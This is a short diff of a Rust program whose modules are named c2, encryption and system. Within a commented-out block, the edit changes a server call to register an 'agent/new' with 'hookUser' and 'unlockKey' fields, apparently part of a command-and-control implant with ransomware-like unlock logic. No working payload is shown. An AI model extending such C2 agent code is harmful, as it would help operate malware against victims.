@@ -1,8 +1,7 @@
 mod c2;
 mod encryption;
 mod system;
-use serde_json::json;
-use serde_json::Value;
+//use serde_json::json;
 use std::{env, process::exit};
 
 #[tokio::main]
@@ -14,19 +13,14 @@ async fn main() {
         "hookUser": "peter",
         "unlockKey": "Some_random_key"
     });
-    let api_res = c2.post(&body, "api/data").await;
 
-    match api_res {
-        Ok(res) => {
-            let json_response: Value = res.json().await.unwrap();
-            println!("{}", json_response)
-        }
-        Err(error) => {
-            if error.is_status() {
-                println!("{}", error.status().unwrap())
-            }
-        }
-    } */
+    let api_res = c2.post(&body, "agent/new").await;
+    if api_res["data"] == json!({}) {
+        println!("Error: {}", api_res["error"]["errorMsg"])
+    }
+    println!("{}", api_res["data"]);
+
+    exit(0); */
 
     let args: Vec<String> = env::args().collect();
     if args.len() < 2 {
